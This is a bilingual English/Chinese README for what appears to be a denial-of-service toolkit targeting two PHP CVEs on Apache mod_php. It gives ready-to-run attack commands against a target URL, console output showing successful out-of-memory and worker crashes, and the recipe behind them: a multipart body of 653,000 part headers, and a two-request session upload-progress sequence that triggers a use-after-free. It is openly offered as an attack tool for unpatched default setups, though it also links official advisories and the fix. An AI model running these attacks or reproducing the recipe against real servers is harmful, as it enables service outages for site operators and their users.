# PHP-uniDoS — Universal DoS for PHP CVE-2026-109618 / CVE-2026-109619

**[中文](#中文说明) | [English](#english)**
<img width="1115" height="628" alt="image" src="https://github.com/user-attachments/assets/9e7bb8d9-b8a7-42d2-be91-b72d1ee1379d" />

## English

> Not based on ELF manipulation. Not related to the pseudo-PoCs from Is4yev/php2shell-poc or eness/php2shell.

Universal DoS attack toolkit for PHP CVE-2026-109618 and CVE-2026-109619. Works against **default PHP configuration** — no server changes needed.

### Quick Start

```bash
python interactive.py http://target:8088
```

```
DoS> 109618
[CVE-2026-109618] OOM attack — part-headers
Step 1: Baseline GET /upload.php...
  HTTP 200, PID 38712
Step 2: Sending 8.0 MiB multipart (part-headers, 653,000 headers)...
  HTTP 200 (149ms)
  OOM triggered!
Step 3: Verify — GET /upload.php...
  HTTP 200, PID 38712
  OOM confirmed — same worker 38712 survived (PHP fatal, not process crash)

DoS> session
[CVE-2026-109619] Session A→B worker crash
Step 1: Acquiring session cookie (GET /upload.php)...
  No cookie from server — generated PHPSESSID=4e1cfd13...
Step 2: Baseline GET /upload.php...
  HTTP 200, PID 38712
Step 3: Producer A (8.0 MiB with session progress)...
  OOM triggered!
Step 4: Consumer B (session progress callback on stale state)...
  ConnectionResetError
Step 5: Verify — GET /upload.php...
  HTTP 200, PID 31800
  Worker crashed! PID 38712 → 31800
```

Two commands. Default `memory_limit=128M`, default `post_max_size=8M`. Zero server modifications.

### How It Works

**CVE-2026-109618 — Multipart Parser OOM**

A crafted multipart body with 653,000 custom part headers fits in ~8 MiB on the wire but causes ~136 MiB of internal PHP allocation during `rfc1867` parsing. This exceeds the default 128M `memory_limit`, triggering OOM before any PHP script runs. Amplification ratio: **~17x**.

**CVE-2026-109619 — Session A→B Worker Crash**

1. **Producer (A):** A multipart body with `PHP_SESSION_UPLOAD_PROGRESS` field + a small file upload (progress tracked) + an amplification part (653K headers → OOM). The OOM leaves stale session progress state in shared memory.
2. **Consumer (B):** A follow-up request with the same session cookie triggers the upload-progress callback on the stale state → use-after-free → **worker crash**.

Both A and B must hit the same persistent Apache worker (mod_php prefork).

### Requirements

- **Target:** Any unpatched PHP 8.5.x with Apache mod_php (prefork)
- **Attacker:** Python 3.8+, no dependencies
- The target must have `session.upload_progress.enabled=On` (default) for CVE-2026-109619
- Works with default `memory_limit=128M` and `post_max_size=8M`

### CLI Usage

```bash
# Interactive console
python interactive.py [target-url]

# CVE-2026-109618: multipart parser OOM
python attacker.py 109618 --target http://target:8088 --execute

# CVE-2026-109619: session A→B worker crash
python session_progress_probe.py --target http://target:8088 --execute
```

### References

- [PHP advisory for CVE-2026-109618](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [PHP advisory for CVE-2026-109619](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [PHP fix commit](https://github.com/php/php-src/commit/31c0ea7d7ff1d1fccb6492e52dab544011628065)

---

## 中文说明

> 与 ELF 操作无关。与 Is4yev/php2shell-poc 或 eness/php2shell 的伪 PoC 无关。

PHP CVE-2026-109618 / CVE-2026-109619 通用 DoS 攻击工具。**默认 PHP 配置即可生效**，无需修改服务器设置。

### 快速开始

```bash
python interactive.py http://目标:8088
```

```
DoS> 109618
[CVE-2026-109618] OOM attack — part-headers
Step 1: Baseline GET /upload.php...
  HTTP 200, PID 38712
Step 2: Sending 8.0 MiB multipart (part-headers, 653,000 headers)...
  HTTP 200 (149ms)
  OOM triggered!
Step 3: Verify — GET /upload.php...
  HTTP 200, PID 38712
  OOM confirmed — same worker 38712 survived (PHP fatal, not process crash)

DoS> session
[CVE-2026-109619] Session A→B worker crash
Step 1: Acquiring session cookie (GET /upload.php)...
  No cookie from server — generated PHPSESSID=4e1cfd13...
Step 2: Baseline GET /upload.php...
  HTTP 200, PID 38712
Step 3: Producer A (8.0 MiB with session progress)...
  OOM triggered!
Step 4: Consumer B (session progress callback on stale state)...
  ConnectionResetError
Step 5: Verify — GET /upload.php...
  HTTP 200, PID 31800
  Worker crashed! PID 38712 → 31800
```

两条命令。默认 `memory_limit=128M`，默认 `post_max_size=8M`，零服务器修改。

### 原理

**CVE-2026-109618 — Multipart 解析 OOM**

构造一个包含 653,000 个自定义 part header 的 multipart 请求体，wire size ~8 MiB，但在 PHP `rfc1867` 解析阶段造成 ~136 MiB 的内部分配。超过默认 128M `memory_limit`，在任何 PHP 脚本执行前触发 OOM。放大比：**~17x**。

**CVE-2026-109619 — Session A→B Worker 崩溃**

1. **Producer (A):** multipart 请求包含 `PHP_SESSION_UPLOAD_PROGRESS` 字段 + 小文件上传（progress 被追踪）+ 放大 part（653K headers → OOM）。OOM 在共享内存中留下 stale session progress 状态。
2. **Consumer (B):** 使用相同 session cookie 的后续请求触发 upload-progress 回调，访问已释放的内存 → use-after-free → **worker 崩溃**。

A 和 B 必须命中同一个常驻 Apache worker（mod_php prefork）。

### 要求

- **目标：** 任何未修补的 PHP 8.5.x + Apache mod_php（prefork）
- **攻击端：** Python 3.8+，无额外依赖
- 目标需要 `session.upload_progress.enabled=On`（默认开启）才能触发 CVE-2026-109619
- 在默认 `memory_limit=128M`、`post_max_size=8M` 下即可工作

### 命令行用法

```bash
# 交互式控制台
python interactive.py [目标URL]

# CVE-2026-109618: multipart 解析 OOM
python attacker.py 109618 --target http://目标:8088 --execute

# CVE-2026-109619: session A→B worker 崩溃
python session_progress_probe.py --target http://目标:8088 --execute
```

### 参考资料

- [CVE-2026-109618 公告](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [CVE-2026-109619 公告](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [PHP 修复提交](https://github.com/php/php-src/commit/31c0ea7d7ff1d1fccb6492e52dab544011628065)
